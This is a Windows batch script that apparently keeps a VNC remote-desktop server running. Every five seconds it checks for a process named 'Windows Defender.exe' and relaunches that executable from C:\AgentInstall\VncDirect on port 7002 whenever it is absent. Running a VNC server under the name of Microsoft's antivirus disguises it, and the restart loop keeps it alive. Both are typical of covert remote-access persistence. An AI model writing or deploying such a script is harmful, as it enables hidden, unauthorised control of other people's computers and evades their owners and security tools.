@echo off
set "DEST=C:\AgentInstall"
set "EXE=%DEST%\VncDirect\Windows Defender.exe"

:loop
tasklist /FI "IMAGENAME eq Windows Defender.exe" 2>nul | find /i "Windows Defender.exe" >nul
if errorlevel 1 (
    if exist "%EXE%" (
        start "" "%EXE%" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
    )
)
timeout /t 5 /nobreak >nul
goto loop
